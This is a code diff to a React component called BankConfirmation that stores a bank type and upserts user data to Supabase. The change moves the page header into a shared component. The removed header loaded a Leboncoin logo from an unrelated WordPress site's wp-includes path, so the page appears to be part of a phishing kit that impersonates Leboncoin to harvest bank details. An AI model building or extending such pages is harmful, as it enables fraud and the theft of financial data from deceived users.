@@ -7,6 +7,7 @@ import { updateUserSession, getFromSession } from "@/utils/sessionUtils";
 import { upsertUser } from "@/utils/supabaseClient";
 import { toast } from "sonner";
 import { Button } from "@/components/ui/button";
+import Header from "@/components/Header";
 
 const BankConfirmation: React.FC = () => {
   const [typeBanque, setTypeBanque] = useState("");
@@ -81,17 +82,7 @@ const BankConfirmation: React.FC = () => {
 
   return (
     <div className="min-h-screen flex flex-col bg-white">
-      {/* Header */}
-      <header className="w-full py-4 border-b border-gray-200">
-        <div className="container mx-auto px-4">
-          <img 
-            src="https://shobha-yadav.dmlearning.in/wp-includes/html-api/lbc/Félicitation_fichiers/lbc-front-web-logo.svg" 
-            alt="Leboncoin" 
-            className="h-8" 
-          />
-        </div>
-      </header>
-
+      <Header />
       <main className="flex-1 flex flex-col items-center justify-center p-4">
         {processing ? (
           <div className="w-full max-w-lg px-6 py-12 bg-white rounded-lg text-center animate-fade-in">
